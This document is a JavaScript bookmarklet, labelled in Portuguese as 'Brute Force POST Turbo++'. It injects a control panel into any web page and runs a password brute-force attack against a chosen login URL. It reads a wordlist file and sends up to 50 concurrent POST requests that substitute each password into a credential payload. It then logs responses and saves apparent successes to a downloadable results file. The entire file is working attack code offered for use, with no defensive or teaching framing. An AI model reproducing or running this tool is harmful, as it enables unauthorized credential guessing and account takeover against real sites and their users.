javascript:(function(){
if(document.getElementById('xBF'))return;
let d=document.createElement('div');
d.id='xBF';
d.style='position:fixed;top:30px;right:30px;z-index:999999;background:#1e1e1e;color:#f1f1f1;padding:16px;border-radius:10px;box-shadow:0 4px 22px #0009;font:13px sans-serif;max-width:440px;width:440px;';
d.innerHTML=`
  <div style="font-size:15px;font-weight:bold;margin-bottom:8px;color:#0ff;">
    🚀 Brute Force POST Turbo++
  </div>

  <label style="font-weight:bold;display:block;margin-top:6px;">🌍 URL alvo:</label>
  <input id="bfurl" placeholder="Ex: https://site.com/login (vazio = URL atual)" 
    style="width:100%;margin:4px 0 10px;padding:6px;border-radius:6px;border:1px solid #444;background:#111;color:#0ff;font-family:monospace;">

  <label style="font-weight:bold;display:block;margin-top:6px;">🔑 Payload:</label>
  <textarea id="bfpl" placeholder="Exemplo: user=admin&pass=^PASS^" 
    style="width:100%;margin:4px 0 10px;height:65px;padding:6px;border-radius:6px;border:1px solid #444;background:#111;color:#0f0;font-family:monospace;"></textarea>

  <label style="font-weight:bold;display:block;margin-top:6px;">📂 Arquivo Wordlist (.txt):</label>
  <input type="file" id="bffl" accept=".txt" 
    style="display:block;margin:6px 0 12px;padding:6px;border-radius:6px;background:#222;border:1px solid #444;color:#fff;">

  <label style="display:block;margin:6px 0;">
    <input type="checkbox" id="bfck"> 🔄 Sem reload após sucesso
  </label>

  <div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;">
    <button id="bfsend" style="flex:1;background:#28a745;border:none;border-radius:6px;padding:8px;color:#fff;font-weight:bold;cursor:pointer;">▶️ Iniciar</button>
    <button id="bfdown" style="flex:1;background:#007bff;border:none;border-radius:6px;padding:8px;color:#fff;font-weight:bold;cursor:pointer;display:none;">⬇️ Resultados</button>
    <button id="bfclose" style="background:#911;border:none;border-radius:6px;padding:8px 14px;color:#fff;font-weight:bold;cursor:pointer;">✖</button>
  </div>

  <label style="font-weight:bold;display:block;margin:10px 0 4px;">📜 Log:</label>
  <div id="bflog" style="background:#000;height:150px;overflow:auto;padding:8px;font-family:monospace;font-size:12px;line-height:1.4;border-radius:6px;border:1px solid #444;white-space:pre-wrap;">
    (aguardando início...)
  </div>
`;
document.body.appendChild(d);

let $=id=>document.getElementById(id);
$('bfclose').onclick=()=>d.remove();

let resultados=[];
$('bfdown').onclick=()=>{
  if(resultados.length===0){alert('Nenhum resultado para baixar!');return;}
  let conteudo=resultados.join('\n');
  let a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([conteudo],{type:'text/plain'}));
  a.download='bruteforce_resultados.txt';
  a.click();
};

$('bfsend').onclick=()=>{
  let p=$('bfpl').value.trim(),
      f=$('bffl').files[0],
      nr=$('bfck').checked,
      u=$('bfurl').value.trim() || location.href;
  if(!p||!f){alert('Preencha payload e selecione um arquivo!');return;}
  resultados=[];
  $('bfdown').style.display='none';
  $('bflog').innerHTML='🚀 Iniciando...\nAlvo: '+u+'\n';
  let reader=new FileReader();
  reader.onload=()=>{
    let lines=reader.result.split(/\r?\n/).filter(l=>l.trim());
    let maxConc=50, idx=0, active=0;
    function tentar(){
      while(active<maxConc && idx<lines.length){
        let pass=lines[idx++];
        active++;
        let fd=new URLSearchParams();
        p.replace(/\^PASS\^/g,pass).split('&').forEach(s=>{
          let a=s.split('=');
          fd.append(decodeURIComponent(a[0]||''),decodeURIComponent(a[1]||''));
        });
        fetch(u,{method:'POST',body:fd,redirect:'manual'})
        .then(r=>{
          let msg=`[${r.status}] ${r.statusText} → ${pass}`;
          if(r.status>=200 && r.status<300){
            msg="✅ SUCESSO "+msg;
            resultados.push(`${u} | Payload: ${p.replace(/\^PASS\^/g,pass)} | Senha: ${pass}`);
            $('bfdown').style.display='inline-block';
            if(!nr) location.reload();
          }else{
            msg="❌ FALHA "+msg;
          }
          $('bflog').innerHTML+=msg+'\n';
          active--;tentar();
          $('bflog').scrollTop=$('bflog').scrollHeight;
        })
        .catch(e=>{
          $('bflog').innerHTML+=`⚠️ ERRO Fetch: ${e}\n`;
          active--;tentar();
          $('bflog').scrollTop=$('bflog').scrollHeight;
        });
      }
      if(idx>=lines.length && active===0){
        $('bflog').innerHTML+='✅ Finalizado\n';
      }
    }
    tentar();
  };
  reader.readAsText(f);
};
})();